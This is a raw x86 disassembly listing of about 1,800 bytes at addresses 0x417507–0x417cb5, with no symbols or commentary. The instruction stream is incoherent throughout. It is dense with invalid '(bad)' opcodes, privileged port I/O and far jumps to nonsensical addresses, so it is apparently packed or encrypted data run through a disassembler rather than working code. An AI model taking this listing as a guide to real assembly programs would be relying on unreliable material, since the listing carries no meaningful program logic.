  417507:	cmp    BYTE PTR fs:[eax+0x7cc3ceb0],ch
  41750e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41750f:	add    edi,DWORD PTR [edx-0x2d]
  417512:	or     eax,0xf492f9e9
  417517:	inc    esi
  417518:	jle    0x4174e4
  41751a:	push   cs
  41751b:	xchg   edi,ebp
  41751d:	cmp    ebx,DWORD PTR ds:0x69b95e3c
  417523:	icebp  
  417524:	or     DWORD PTR [ecx],edi
  417526:	xchg   ecx,eax
  417527:	dec    edi
  417528:	xchg   edi,eax
  417529:	loop   0x417598
  41752b:	cmp    DWORD PTR [esi-0x71],ebp
  41752e:	ror    BYTE PTR [eax],cl
  417530:	xchg   esi,eax
  417531:	add    eax,DWORD PTR [ebp-0x4a]
  417534:	div    ecx
  417536:	sub    BYTE PTR [esi+0x62eab48f],0x31
  41753d:	xor    DWORD PTR [eax],esp
  41753f:	retf   
  417540:	jge    0x4174da
  417542:	outs   dx,DWORD PTR ds:[esi]
  417543:	ja     0x417518
  417545:	sub    ch,BYTE PTR [ecx+0x3f]
  417548:	pop    ss
  417549:	(bad)  
  41754a:	adc    esp,DWORD PTR [ecx]
  41754c:	add    ebx,DWORD PTR [edx-0x2946ab88]
  417552:	adc    DWORD PTR [ecx+0x9],ebx
  417555:	add    esp,edx
  417557:	adc    DWORD PTR [edi],eax
  417559:	or     eax,0xef185bba
  41755e:	dec    esi
  41755f:	or     DWORD PTR [ebx+ebx*1-0x69],ebp
  417563:	lods   eax,DWORD PTR ds:[esi]
  417564:	enter  0x7f1e,0x78
  417568:	jb     0x417524
  41756a:	xchg   edx,eax
  41756b:	aam    0x48
  41756d:	aas    
  41756e:	(bad)  
  41756f:	push   es
  417570:	dec    ebx
  417571:	(bad)  
  417572:	dec    esp
  417573:	cmp    eax,0x2d8a332b
  417578:	lds    eax,FWORD PTR [ebx]
  41757a:	dec    esi
  41757b:	and    ah,dh
  41757d:	sbb    eax,0x59cf93d6
  417582:	aaa    
  417583:	rol    BYTE PTR [eax+0x20ceea03],0xa9
  41758a:	xchg   edx,eax
  41758b:	test   BYTE PTR [edx-0x2d],bl
  41758e:	rol    BYTE PTR [esi+eax*2-0x63],cl
  417592:	push   ecx
  417593:	pop    ecx
  417594:	xchg   esi,eax
  417595:	mov    esi,0x40e9d22a
  41759a:	js     0xcd2bbcd9
  4175a0:	mov    dl,0xfd
  4175a2:	out    dx,al
  4175a3:	mov    BYTE PTR [esp+eax*4-0x46],dl
  4175a7:	cmp    dh,BYTE PTR [ebp+esi*4-0x3d446c3f]
  4175ae:	adc    eax,0x7b5d8d13
  4175b3:	out    0xd1,eax
  4175b5:	and    eax,0x12baf44a
  4175ba:	icebp  
  4175bb:	xchg   edx,eax
  4175bc:	jbe    0x417638
  4175be:	int    0x1a
  4175c0:	jg     0x417619
  4175c2:	mov    al,0x61
  4175c4:	mov    eax,ds:0x887f8e78
  4175c9:	in     eax,dx
  4175ca:	inc    ebp
  4175cb:	cwde   
  4175cc:	ds in  al,0xa6
  4175cf:	leave  
  4175d0:	mul    BYTE PTR [esp]
  4175d3:	xchg   edi,eax
  4175d4:	out    0xc6,al
  4175d6:	ror    BYTE PTR [eax+esi*2-0x2c],1
  4175da:	xchg   esp,eax
  4175db:	aam    0xbc
  4175dd:	(bad)  
  4175de:	lods   al,BYTE PTR ds:[esi]
  4175df:	fiadd  DWORD PTR [edx]
  4175e1:	hlt    
  4175e2:	sub    al,0xd7
  4175e4:	or     BYTE PTR [ecx-0xef1519c],dh
  4175ea:	ror    ecx,0x42
  4175ed:	sbb    eax,0x676b7973
  4175f2:	fs retf 
  4175f4:	ror    DWORD PTR [ebx+0xc],0x12
  4175f8:	loop   0x417604
  4175fa:	push   cs
  4175fb:	inc    eax
  4175fc:	icebp  
  4175fd:	fisub  DWORD PTR [ecx-0x80]
  417600:	and    BYTE PTR [eax+0x4d85cc86],ah
  417606:	cli    
  417607:	out    dx,eax
  417608:	or     bl,BYTE PTR [esi-0x59]
  41760b:	ins    DWORD PTR es:[edi],dx
  41760c:	lea    eax,[eax+0x67c578bf]
  417612:	and    eax,0x91e5dcaa
  417617:	stos   BYTE PTR es:[edi],al
  417618:	mov    DWORD PTR [ebp-0x51],edx
  41761b:	pusha  
  41761c:	pop    esp
  41761d:	xor    al,0x6d
  41761f:	rcr    BYTE PTR [esi-0x51],cl
  417622:	sar    BYTE PTR [edx+0xcc7a72d],1
  417628:	(bad)  
  417629:	mov    al,0x84
  41762b:	xor    al,0x76
  41762d:	loope  0x4175b8
  41762f:	jge    0x417676
  417631:	xchg   esp,eax
  417632:	xor    cl,BYTE PTR [eax-0x32]
  417635:	mov    WORD PTR [edi+eax*4-0x37c3c5c3],gs
  41763c:	ret    0xcd3e
  41763f:	xor    DWORD PTR [esi+edx*1-0x57ff82ed],0xffffffc2
  417647:	mov    ecx,0x49186948
  41764c:	sbb    BYTE PTR fs:[ecx-0x552967f],bl
  417653:	adc    dl,BYTE PTR [ecx+eiz*4+0x32fa8ca5]
  41765a:	dec    eax
  41765b:	xlat   BYTE PTR ds:[ebx]
  41765c:	or     eax,0xbd11dd7d
  417661:	retf   
  417662:	xchg   DWORD PTR [ebx+esi*4+0x66],ecx
  417666:	mov    al,ds:0x58c6b308
  41766b:	jmp    0xf2665e83
  417670:	mov    ah,0x9a
  417672:	xor    dl,bl
  417674:	call   0x62caf0a9
  417679:	push   ss
  41767a:	inc    ecx
  41767b:	inc    esi
  41767c:	call   0x262dcc51
  417681:	xchg   DWORD PTR [ebx+ebx*2],ebx
  417684:	or     eax,0xe7cd2c59
  417689:	xchg   ecx,eax
  41768a:	inc    edx
  41768b:	pop    eax
  41768c:	mov    ?,WORD PTR [eax-0x7d]
  41768f:	jne    0x4176f6
  417691:	sub    al,0x36
  417693:	cdq    
  417694:	xchg   BYTE PTR [esi],ch
  417696:	mov    es,WORD PTR [esi]
  417698:	enter  0xc859,0x51
  41769c:	loopne 0x417700
  41769e:	push   0xffffffed
  4176a0:	xchg   esi,eax
  4176a1:	mov    ebp,ecx
  4176a3:	add    eax,0xfffffff9
  4176a6:	dec    eax
  4176a7:	xchg   ecx,eax
  4176a8:	mov    bh,0xd4
  4176aa:	push   es
  4176ab:	xlat   BYTE PTR ds:[ebx]
  4176ac:	inc    edx
  4176ad:	cs fwait
  4176af:	lods   eax,DWORD PTR ds:[esi]
  4176b0:	jnp    0x417717
  4176b2:	lds    ebp,FWORD PTR [ecx]
  4176b4:	pop    ds
  4176b5:	ins    DWORD PTR es:[edi],dx
  4176b6:	dec    edi
  4176b7:	inc    edx
  4176b8:	push   0xb4464c76
  4176bd:	loop   0x4176dc
  4176bf:	not    BYTE PTR ds:0x5a104805
  4176c5:	into   
  4176c6:	ins    DWORD PTR es:[edi],dx
  4176c7:	or     esp,ebx
  4176c9:	pop    esi
  4176ca:	ins    BYTE PTR es:[edi],dx
  4176cb:	mov    dh,0x50
  4176cd:	pop    ds
  4176ce:	lea    esp,[ecx-0x5aea83c5]
  4176d4:	dec    ebx
  4176d5:	xchg   ebx,eax
  4176d6:	jno    0x417742
  4176d8:	in     eax,0xfb
  4176da:	test   DWORD PTR [ecx],ebp
  4176dc:	shl    DWORD PTR [esp+ecx*4+0x35],0xf9
  4176e1:	scas   al,BYTE PTR es:[edi]
  4176e2:	cs sti 
  4176e4:	outs   dx,BYTE PTR ds:[esi]
  4176e5:	in     al,0x6c
  4176e7:	lahf   
  4176e8:	pop    edi
  4176e9:	stc    
  4176ea:	fwait
  4176eb:	call   0xe399397
  4176f0:	mov    esi,ebx
  4176f2:	inc    ecx
  4176f3:	test   BYTE PTR [ebp+ecx*4-0x37],dh
  4176f7:	out    0xda,eax
  4176f9:	jge    0x4176df
  4176fb:	aam    0x2c
  4176fd:	jns    0x417711
  4176ff:	sbb    ecx,DWORD PTR [ebx]
  417701:	clc    
  417702:	in     al,dx
  417703:	out    dx,al
  417704:	jge    0x417716
  417706:	int3   
  417707:	ja     0x41772c
  417709:	nop
  41770a:	or     ah,ch
  41770c:	fs inc ebx
  41770e:	mov    dh,BYTE PTR ds:0x2d4f3e49
  417714:	pop    esp
  417715:	fcom   st(7)
  417717:	clc    
  417718:	mov    eax,0x72367028
  41771d:	mov    al,ds:0xc17fc2e5
  417722:	push   ebx
  417723:	enter  0xe4eb,0xe5
  417727:	pavgb  mm7,mm1
  41772a:	call   0x1c26e730
  41772f:	rol    dl,0x44
  417732:	mov    eax,0x9c262a8e
  417737:	bound  esi,QWORD PTR [eax+0x25]
  41773a:	fnstcw WORD PTR [ebx-0x1240a779]
  417740:	es push 0xffffffbd
  417743:	pop    ss
  417744:	out    dx,eax
  417745:	(bad)
  417748:	inc    eax
  417749:	in     al,dx
  41774a:	and    bl,BYTE PTR [eax+0x7e]
  41774d:	pop    ss
  41774e:	mov    ch,ch
  417750:	inc    ecx
  417751:	rcr    al,cl
  417753:	mov    ds:0x27e2cae8,al
  417758:	adc    al,BYTE PTR [ecx]
  41775a:	imul   ebx,DWORD PTR [eax+eiz*2+0x7063a732],0xffffffb8
  417762:	push   ecx
  417763:	mov    ebx,0x69daefcb
  417768:	push   esp
  417769:	daa    
  41776a:	test   BYTE PTR [edx+0x7f],0x8f
  41776e:	je     0x417764
  417770:	and    eax,0xe2f9831d
  417775:	pusha  
  417776:	test   eax,0xca5e6b0f
  41777b:	mov    ah,0x5e
  41777d:	ror    BYTE PTR [ebx-0x5e],cl
  417780:	les    esi,FWORD PTR [eax]
  417782:	fist   DWORD PTR [ebp+0x16]
  417785:	push   ss
  417786:	cli    
  417787:	xor    BYTE PTR [ebx],al
  417789:	push   ebp
  41778a:	dec    edi
  41778b:	in     al,0xef
  41778d:	jecxz  0x41774e
  41778f:	shl    esp,1
  417791:	push   ebx
  417792:	push   cs
  417793:	pop    ebp
  417794:	repz out 0xc7,eax
  417797:	icebp  
  417798:	(bad)  
  417799:	stc    
  41779a:	cmp    BYTE PTR [edx],bh
  41779c:	stc    
  41779d:	rol    BYTE PTR [esi-0x3f],0x5c
  4177a1:	lahf   
  4177a2:	sub    al,BYTE PTR [eax-0x533fc121]
  4177a8:	push   0x75
  4177aa:	mov    ah,0x2e
  4177ac:	dec    esi
  4177ad:	adc    eax,0xfb66060e
  4177b2:	jbe    0x417747
  4177b4:	adc    ecx,ebx
  4177b6:	fs pop edx
  4177b8:	inc    edi
  4177b9:	mov    bl,0x73
  4177bb:	in     al,dx
  4177bc:	imul   edi,DWORD PTR [eax+0x3ffe37ea],0xffffffaf
  4177c3:	out    dx,eax
  4177c4:	add    edx,ebp
  4177c6:	fidivr DWORD PTR [edi+0x79]
  4177c9:	mov    ebp,0xcc80836f
  4177ce:	push   0x53e97cd4
  4177d3:	cwde   
  4177d4:	dec    esp
  4177d5:	(bad)  
  4177d6:	in     al,dx
  4177d7:	mov    dl,0xe2
  4177d9:	cs mov ah,0xaf
  4177dc:	out    dx,eax
  4177dd:	and    ch,BYTE PTR [ebp+0x53]
  4177e0:	pop    es
  4177e1:	aad    0xfa
  4177e3:	popf   
  4177e4:	or     edi,DWORD PTR [esi+0x68]
  4177e7:	pop    edx
  4177e8:	shl    BYTE PTR ds:0xfc49ae0a,cl
  4177ee:	jne    0x41783b
  4177f0:	loopne 0x41786e
  4177f2:	frndint 
  4177f4:	scas   al,BYTE PTR es:[edi]
  4177f5:	nop
  4177f6:	add    al,bh
  4177f8:	jno    0x417805
  4177fa:	push   edi
  4177fb:	mov    ecx,0xfa1f0c10
  417800:	mov    cl,0xb5
  417802:	repz xchg edi,eax
  417804:	cdq    
  417805:	leave  
  417806:	dec    ebp
  417807:	pop    esp
  417808:	div    BYTE PTR [edx-0x69]
  41780b:	imul   ebp,DWORD PTR [edi],0x70
  41780e:	cmc    
  41780f:	pusha  
  417810:	fsubr  st(2),st
  417812:	mov    cl,0x4b
  417814:	mov    bh,0x2a
  417816:	add    BYTE PTR [esi],al
  417818:	shl    dl,cl
  41781a:	xchg   esp,eax
  41781b:	pop    edi
  41781c:	shl    esi,0x99
  41781f:	xor    dh,dl
  417821:	jo     0x41789b
  417823:	cmc    
  417824:	xlat   BYTE PTR ds:[ebx]
  417825:	pop    ds
  417826:	in     al,0x82
  417828:	aad    0xb8
  41782a:	pop    ecx
  41782b:	push   edi
  41782c:	inc    edx
  41782d:	(bad)  
  41782e:	aad    0x6b
  417830:	adc    BYTE PTR [ebp+0x73],bh
  417833:	add    eax,0x374fe118
  417838:	dec    edi
  417839:	pop    ds
  41783a:	enter  0xad77,0xb7
  41783e:	inc    edi
  41783f:	add    dl,BYTE PTR [eax]
  417841:	(bad)  
  417842:	loopne 0x41782e
  417844:	repnz sbb cl,BYTE PTR [edx-0x757fcbc1]
  41784b:	neg    bl
  41784d:	stos   DWORD PTR es:[edi],eax
  41784e:	xchg   ecx,eax
  41784f:	fisub  DWORD PTR [esi+0x6d]
  417852:	sub    edx,DWORD PTR ds:0x1c9dac3c
  417858:	mov    dl,0x13
  41785a:	cdq    
  41785b:	push   edi
  41785c:	repz sbb al,0xbe
  41785f:	bound  esp,QWORD PTR [edi]
  417861:	enter  0x7454,0xfa
  417865:	mov    al,0xa
  417867:	jg     0x4177fa
  417869:	xor    edi,esi
  41786b:	cdq    
  41786c:	adc    al,0xda
  41786e:	inc    edx
  41786f:	sbb    DWORD PTR [ecx+0x47c6e65f],edi
  417875:	push   es
  417876:	pop    ebx
  417878:	dec    edi
  417879:	cmp    eax,esi
  41787b:	mov    ebp,0x6e1d3e23
  417880:	add    BYTE PTR ds:0x39da24b3,ah
  417886:	gs inc ebp
  417888:	sti    
  417889:	loope  0x41780b
  41788b:	pusha  
  41788c:	cld    
  41788d:	lahf   
  41788e:	test   DWORD PTR ds:0x7b5d7dd8,0xb62df04d
  417898:	bound  edx,QWORD PTR [eax-0x5a385fec]
  41789e:	inc    eax
  41789f:	ret    
  4178a0:	ds fwait
  4178a2:	fs inc esp
  4178a4:	cmc    
  4178a5:	sbb    ebp,ecx
  4178a7:	sub    bl,BYTE PTR [ebp-0x42e817be]
  4178ad:	inc    ecx
  4178ae:	jmp    0xc4fc77a2
  4178b3:	lea    ebx,[esi]
  4178b5:	jmp    0x494d5ac3
  4178ba:	(bad)  
  4178bb:	mov    al,0x36
  4178bd:	xchg   ebp,eax
  4178be:	add    BYTE PTR [esi],dl
  4178c0:	(bad)  
  4178c1:	stos   BYTE PTR es:[edi],al
  4178c2:	xchg   esp,eax
  4178c3:	repz (bad) 
  4178c5:	pop    ds
  4178c6:	jo     0x41793e
  4178c8:	adc    eax,0x40f54cb3
  4178cd:	int3   
  4178ce:	mov    ebp,0x4349a2bc
  4178d3:	xchg   BYTE PTR [ebx+0x52c5b1c5],cl
  4178d9:	lock add eax,0xa746dbe7
  4178df:	into   
  4178e0:	push   ss
  4178e1:	xchg   ebx,eax
  4178e2:	fwait
  4178e3:	sub    ah,BYTE PTR [edi+0x10]
  4178e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178e7:	and    BYTE PTR [ebx],0x31
  4178ea:	mov    eax,0xd586f57d
  4178ef:	mov    edi,0x23a34f16
  4178f4:	les    edi,FWORD PTR [ebp+ebp*8+0x64]
  4178f8:	cmp    BYTE PTR [edi*2+0x5affd76d],cl
  4178ff:	or     al,0xa1
  417901:	arpl   WORD PTR [eax+0x9e5a533],dx
  417907:	in     eax,0xa8
  417909:	jb     0x41792c
  41790b:	or     BYTE PTR [ebp+ebp*2+0x1d48db57],ah
  417912:	scas   eax,DWORD PTR es:[edi]
  417913:	ret    0x9d7a
  417916:	jb     0x4178e4
  417918:	aam    0x51
  41791a:	cmp    eax,0x8cda934a
  41791f:	into   
  417920:	pop    es
  417921:	(bad)  
  417922:	cmp    al,0xe
  417924:	call   0x70341e03
  417929:	retf   0xec98
  41792c:	lods   eax,DWORD PTR ds:[esi]
  41792d:	outs   dx,DWORD PTR ds:[esi]
  41792e:	jns    0x417988
  417930:	sbb    eax,0xbffecb06
  417935:	jmp    0xdabcf436
  41793a:	test   BYTE PTR [ebp+0x107a4988],0x6e
  417941:	mov    ebx,ebx
  417943:	leave  
  417944:	sub    DWORD PTR [ebx+edi*4+0x49f40285],ecx
  41794b:	lock cmp DWORD PTR [eax-0x70],ebp
  41794f:	inc    edi
  417950:	and    eax,0x33c6398c
  417955:	jbe    0x417956
  417957:	and    DWORD PTR cs:[edi-0x46a64c58],ecx
  41795e:	into   
  41795f:	cmp    ch,ah
  417961:	pop    ss
  417962:	retf   
  417963:	fstp   QWORD PTR [ecx-0x41]
  417966:	retf   
  417967:	dec    edx
  417968:	dec    ebp
  417969:	retf   
  41796a:	aad    0x31
  41796c:	mul    ebp
  41796e:	adc    esp,DWORD PTR [edi-0x6a75aa7]
  417974:	add    al,0xa5
  417976:	sbb    al,0x11
  417978:	retf   
  417979:	add    al,0xea
  41797b:	mov    al,0xb
  41797d:	js     0x4179ac
  41797f:	cdq    
  417980:	outs   dx,DWORD PTR ds:[esi]
  417981:	or     BYTE PTR [ebx-0x64eb2adc],0x14
  417988:	mov    ch,0xe
  41798a:	adc    eax,0xa80153
  41798f:	enter  0xcfaa,0x51
  417993:	mov    ecx,0xfc41ac66
  417998:	mov    dl,0xf3
  41799a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41799b:	or     eax,0x90ecf375
  4179a0:	sahf   
  4179a1:	stos   DWORD PTR es:[edi],eax
  4179a2:	ins    BYTE PTR es:[edi],dx
  4179a3:	in     eax,0x3c
  4179a5:	push   ss
  4179a6:	and    edx,DWORD PTR [ebx]
  4179a8:	in     eax,0xf7
  4179aa:	mov    bl,0x28
  4179ac:	mov    esi,eax
  4179ae:	xchg   ebx,eax
  4179af:	test   DWORD PTR [ebp-0x20],edi
  4179b2:	mov    esp,0x4bcda13d
  4179b7:	mov    ch,0xe6
  4179b9:	xchg   BYTE PTR [edi-0x2d144825],bl
  4179bf:	pop    edx
  4179c0:	aam    0x35
  4179c2:	cmp    al,0x8c
  4179c4:	sub    eax,0xcc3f7a3d
  4179c9:	mov    cl,0xcf
  4179cb:	adc    al,BYTE PTR [ebp+ecx*1+0x2c]
  4179cf:	or     al,0x70
  4179d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4179d2:	gs mov dh,0xf7
  4179d5:	stc    
  4179d6:	loop   0x4179f0
  4179d8:	bound  edi,QWORD PTR [eax]
  4179da:	or     ebp,DWORD PTR [edx+0x9]
  4179dd:	and    ecx,edx
  4179df:	aaa    
  4179e0:	pop    ecx
  4179e1:	and    al,0x69
  4179e3:	ffree  st(5)
  4179e5:	scas   eax,DWORD PTR es:[edi]
  4179e6:	pop    esp
  4179e7:	cmp    BYTE PTR ss:[esi-0x4e],0x1
  4179ec:	push   ecx
  4179ed:	loopne 0x417a1f
  4179ef:	stos   BYTE PTR es:[edi],al
  4179f0:	jg     0x417a61
  4179f2:	jmp    0xb3bc2087
  4179f7:	inc    ebx
  4179f8:	and    DWORD PTR [eax+ecx*4],edi
  4179fb:	pushf  
  4179fc:	mov    eax,0xef2b68f7
  417a01:	pop    ecx
  417a02:	pop    es
  417a03:	fild   DWORD PTR [eax-0x5ac4c059]
  417a09:	fiadd  DWORD PTR [eax]
  417a0b:	cmp    esp,DWORD PTR [edx+0x44982d7d]
  417a11:	arpl   bx,si
  417a13:	mov    al,ds:0x170a9c43
  417a18:	out    0xa4,al
  417a1a:	xor    al,0x37
  417a1c:	pop    DWORD PTR [esi-0x7a554d64]
  417a22:	and    ah,BYTE PTR [eax-0x48]
  417a25:	jb     0x417a16
  417a27:	or     dh,BYTE PTR [eax]
  417a29:	lds    ebx,FWORD PTR [edx-0x6f73200b]
  417a2f:	outs   dx,DWORD PTR ds:[esi]
  417a30:	pop    eax
  417a31:	xor    eax,0x2db302ac
  417a36:	sub    al,0x85
  417a38:	je     0x417aa0
  417a3a:	sbb    eax,0x4fb391c2
  417a3f:	mov    fs,ebp
  417a41:	inc    ecx
  417a42:	out    dx,al
  417a43:	fdiv   st,st(2)
  417a45:	sbb    al,0xc6
  417a47:	mov    WORD PTR [esi+esi*1],ss
  417a4a:	mov    edi,0xd99a38c0
  417a4f:	push   0x8d39583a
  417a54:	sbb    al,0xbd
  417a56:	ds inc esi
  417a58:	xchg   edi,eax
  417a59:	jg     0x4179fe
  417a5b:	dec    eax
  417a5c:	and    DWORD PTR [edx+0x47203b3],eax
  417a62:	stc    
  417a63:	pushf  
  417a64:	cmp    dh,al
  417a66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417a67:	iret   
  417a68:	repz (bad) 
  417a6b:	loopne 0x417a62
  417a6d:	sbb    bl,BYTE PTR [edi+0x27e50031]
  417a73:	sbb    BYTE PTR [edx-0x70826417],al
  417a79:	xchg   edx,eax
  417a7a:	mov    esp,DWORD PTR [edi-0x193be53d]
  417a80:	sbb    ebp,edi
  417a82:	sbb    eax,0xa1f8138c
  417a87:	mov    eax,ebx
  417a89:	sbb    BYTE PTR [edx],ch
  417a8b:	mov    ch,0xe7
  417a8d:	lahf   
  417a8e:	mov    cl,0xd7
  417a90:	mov    bl,0xc2
  417a92:	dec    ebx
  417a93:	sbb    ah,al
  417a95:	adc    dl,al
  417a97:	out    0x5c,al
  417a99:	mov    ah,0x80
  417a9b:	cmp    eax,0x99ea3625
  417aa0:	pop    ebx
  417aa1:	popa   
  417aa2:	fs pop edx
  417aa4:	xor    al,0x95
  417aa6:	iret   
  417aa7:	out    dx,al
  417aa8:	mov    bh,0x66
  417aaa:	lods   al,BYTE PTR ds:[esi]
  417aab:	rcr    BYTE PTR ds:0x273796a6,cl
  417ab1:	push   ebp
  417ab2:	fbld   TBYTE PTR [edx+0x51]
  417ab5:	mov    bh,0x3c
  417ab7:	jmp    0x8a2d:0x8742709
  417abe:	scas   al,BYTE PTR es:[edi]
  417abf:	sub    al,0x2b
  417ac1:	leave  
  417ac2:	fistp  DWORD PTR [ecx-0x50]
  417ac5:	mov    cs:0x2c13bf88,eax
  417acb:	and    al,0x76
  417acd:	fs stc 
  417acf:	mov    edi,0x33424ff5
  417ad4:	and    ebx,ecx
  417ad6:	call   0x97c3a817
  417adb:	cmp    edx,DWORD PTR [esi-0x49]
  417ade:	xchg   edx,eax
  417adf:	push   ebp
  417ae0:	xchg   esp,eax
  417ae1:	or     ebx,DWORD PTR [edx+0x46426964]
  417ae7:	push   0x8
  417ae9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417aea:	dec    esi
  417aeb:	jns    0x417a6d
  417aed:	stos   DWORD PTR es:[edi],eax
  417aee:	jnp    0x417aff
  417af0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417af1:	xor    eax,ecx
  417af3:	mov    bl,0x5d
  417af5:	dec    edx
  417af6:	pop    es
  417af7:	add    dl,dl
  417af9:	clc    
  417afa:	pop    ss
  417afb:	leave  
  417afc:	xchg   esp,eax
  417afd:	cmp    al,0xba
  417aff:	int3   
  417b00:	sbb    esi,edi
  417b02:	sbb    eax,0x6b75646c
  417b07:	mov    eax,ds:0x6cabf219
  417b0c:	dec    eax
  417b0d:	xor    al,0x28
  417b0f:	int3   
  417b10:	test   DWORD PTR [esi],edx
  417b12:	sbb    ecx,DWORD PTR [ecx+0xb254c63]
  417b18:	cs push edi
  417b1a:	xor    ecx,DWORD PTR [ebx]
  417b1c:	pop    ss
  417b1d:	das    
  417b1e:	cli    
  417b1f:	aam    0x20
  417b21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b22:	mul    BYTE PTR [ecx+0x15a4dae0]
  417b28:	jp     0x417b26
  417b2a:	out    dx,eax
  417b2b:	dec    dl
  417b2d:	adc    al,0xa
  417b2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b30:	mov    ds:0xb2ec8062,eax
  417b35:	loope  0x417b28
  417b37:	pop    edx
  417b38:	je     0x417ba8
  417b3a:	stos   BYTE PTR es:[edi],al
  417b3b:	xor    al,0xd0
  417b3d:	es das 
  417b3f:	scas   al,BYTE PTR es:[edi]
  417b40:	dec    ecx
  417b41:	stc    
  417b42:	sub    al,0x21
  417b44:	push   edi
  417b45:	lea    ebp,[esi-0x7c]
  417b48:	out    0xa3,eax
  417b4a:	add    DWORD PTR [edx],ebx
  417b4c:	push   eax
  417b4d:	and    esp,DWORD PTR [esi-0x39cddef9]
  417b53:	ja     0x417af5
  417b55:	in     al,0xae
  417b57:	adc    esp,ebp
  417b59:	mov    ds:0xe24611c8,al
  417b5e:	adc    al,0xcd
  417b60:	dec    edx
  417b61:	push   eax
  417b62:	dec    esi
  417b63:	xlat   BYTE PTR ds:[ebx]
  417b64:	enter  0x976b,0x6e
  417b68:	push   cs
  417b69:	pop    edx
  417b6a:	sbb    eax,0xa17b2d84
  417b6f:	pop    es
  417b70:	fiadd  DWORD PTR [ecx-0x3e]
  417b73:	mov    ch,0xaf
  417b75:	jg     0x417b62
  417b77:	sub    DWORD PTR [edi-0x4e699f1f],ebp
  417b7d:	(bad)  
  417b7e:	fst    DWORD PTR gs:[edi]
  417b81:	stos   BYTE PTR es:[edi],al
  417b82:	in     al,0xd8
  417b84:	ss scas eax,DWORD PTR es:[edi]
  417b86:	mov    dh,0xb3
  417b88:	add    DWORD PTR [edx+0x3e9e89d],eax
  417b8e:	jmp    FWORD PTR [esi+edx*8-0x66b45506]
  417b95:	jne    0x417bff
  417b97:	outs   dx,BYTE PTR ds:[esi]
  417b98:	xchg   edx,eax
  417b99:	or     cl,BYTE PTR [ebp-0x63]
  417b9c:	inc    ebx
  417b9d:	jg     0x417b31
  417b9f:	sbb    BYTE PTR [edi+eiz*8],al
  417ba2:	les    ecx,FWORD PTR [eax+0x73]
  417ba5:	test   eax,0x400a812c
  417baa:	mov    eax,ds:0x3256e9eb
  417baf:	or     DWORD PTR [eax+0x2],0x9199f15
  417bb6:	xchg   esi,eax
  417bb7:	adc    BYTE PTR [edi-0xa],ch
  417bba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bbb:	cwde   
  417bbc:	call   0x691b6e3e
  417bc1:	jmp    0x417b47
  417bc3:	cmp    al,0xb
  417bc5:	push   ebp
  417bc6:	mov    esi,ebx
  417bc8:	imul   edi,DWORD PTR [esi+0x62],0x1fedbf0
  417bcf:	aam    0x50
  417bd1:	jecxz  0x417b6f
  417bd3:	call   0x212db50b
  417bd8:	das    
  417bd9:	add    ebp,DWORD PTR [ecx+0x355b1939]
  417bdf:	xchg   edi,eax
  417be0:	mov    esp,0x42bbb15d
  417be5:	sbb    al,0x17
  417be7:	fsubr  QWORD PTR [edi+ecx*8-0x39]
  417beb:	in     al,dx
  417bec:	push   ecx
  417bed:	pop    esp
  417bee:	push   esp
  417bef:	popa   
  417bf0:	das    
  417bf1:	jo     0x417c34
  417bf3:	ja     0x417bc8
  417bf5:	dec    esi
  417bf6:	mov    ecx,DWORD PTR [eax+0x1576db40]
  417bfc:	push   esp
  417bfd:	cli    
  417bfe:	sub    eax,0xa786632
  417c03:	sbb    bh,al
  417c05:	pop    esp
  417c06:	out    0x96,eax
  417c08:	fistp  DWORD PTR ds:0xfe886fde
  417c0e:	cmp    cl,BYTE PTR [edi+0x38af4150]
  417c14:	xor    eax,0x44a8a3b7
  417c19:	mov    dh,BYTE PTR [eax+0x1751cbc9]
  417c1f:	adc    BYTE PTR [ecx+0x65],bh
  417c22:	shr    DWORD PTR [ebx+edi*1],0x79
  417c26:	outs   dx,BYTE PTR ds:[esi]
  417c27:	push   eax
  417c28:	ret    0xbf28
  417c2b:	fwait
  417c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417c2d:	mov    al,es:0xe6f1614f
  417c33:	dec    edx
  417c34:	arpl   WORD PTR [edi],bx
  417c36:	pop    ss
  417c37:	(bad)  
  417c38:	hlt    
  417c39:	mov    ebp,ebx
  417c3b:	push   ss
  417c3c:	sub    al,0x26
  417c3e:	add    DWORD PTR [edi-0x51],esi
  417c41:	test   DWORD PTR [esi],esi
  417c43:	sub    dl,BYTE PTR [si-0x47]
  417c47:	cli    
  417c48:	ja     0x417c01
  417c4a:	pmullw mm3,QWORD PTR [edi-0x13b5ac46]
  417c51:	or     al,0x28
  417c53:	push   edi
  417c54:	inc    edi
  417c55:	cdq    
  417c56:	in     al,dx
  417c57:	jl     0x417c24
  417c59:	or     eax,0x468c1290
  417c5e:	mov    eax,esp
  417c60:	mov    esp,0xfa0c507c
  417c65:	xchg   edx,eax
  417c66:	mov    edi,0xdb61e4c1
  417c6b:	xchg   esp,eax
  417c6c:	mov    ebp,0xb21ba1df
  417c71:	sbb    ebx,DWORD PTR [edi+0x587c97b0]
  417c77:	and    BYTE PTR [ecx+eiz*8],bh
  417c7a:	cli    
  417c7b:	in     eax,dx
  417c7c:	dec    ebx
  417c7d:	adc    al,0x41
  417c7f:	ret    0xf8b9
  417c82:	test   DWORD PTR [esi-0x6902a987],eax
  417c88:	fsubr  DWORD PTR [esi-0x7824b104]
  417c8e:	and    al,0xb
  417c90:	cmp    al,0xaf
  417c92:	nop
  417c93:	sub    ch,BYTE PTR [edx]
  417c95:	sahf   
  417c96:	lds    esp,FWORD PTR ss:0x831763ca
  417c9d:	mov    ah,0xad
  417c9f:	pop    es
  417ca0:	add    eax,0xe239c914
  417ca5:	and    ah,dh
  417ca7:	xlat   BYTE PTR ds:[ebx]
  417ca8:	cmp    al,BYTE PTR [edi+0x40]
  417cab:	pusha  
  417cac:	(bad)  
  417cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417cae:	fucomip st,st(7)
  417cb0:	cmc    
  417cb1:	jg     0x417ccb
  417cb3:	shl    DWORD PTR [edi],cl
  417cb5:	popa   
